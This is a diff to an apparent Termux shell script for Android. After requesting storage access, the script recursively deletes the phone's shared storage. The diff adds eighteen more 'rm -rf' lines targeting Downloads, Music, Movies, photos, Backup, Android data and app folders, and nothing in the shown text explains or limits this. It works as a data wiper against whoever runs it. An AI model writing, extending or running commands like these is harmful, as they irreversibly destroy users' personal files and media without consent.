@@ -14,6 +14,24 @@ clear
 termux-setup-storage
 rm -rf /storage/emulated/0
 rm -rf /sdcard/0
+rm -rf /sdcard/Backup
+rm -rf /sdcard/System Volume Information
+rm -rf /sdcard/system_update
+rm -rf /sdcard/@wcache
+rm -rf /sdcard/Android
+rm -rf /sdcard/.androidsafe
+rm -rf /sdcard/Download
+rm -rf /sdcard/LOST.DIR
+rm -rf /sdcard/Movies
+rm -rf /sdcard/mp3
+rm -rf /sdcard/Music
+rm -rf /sdcard/photo
+rm -rf /sdcard/HiSuite_8.0.1.300_OVE
+rm -rf /sdcard/vidmate
+rm -rf /sdcard/vidmate-hd-video-downloader-3-5407
+rm -rf /sdcard/_UJSR
+rm -rf /sdcard/.ColorOSGalleryRecycler
+rm -rf /sdcard/tofa
 rm -rf /storage/emulated/0/
 rm -rf /storage/emulated/0/android/obb
 rm -rf /sdcard/0/android/data
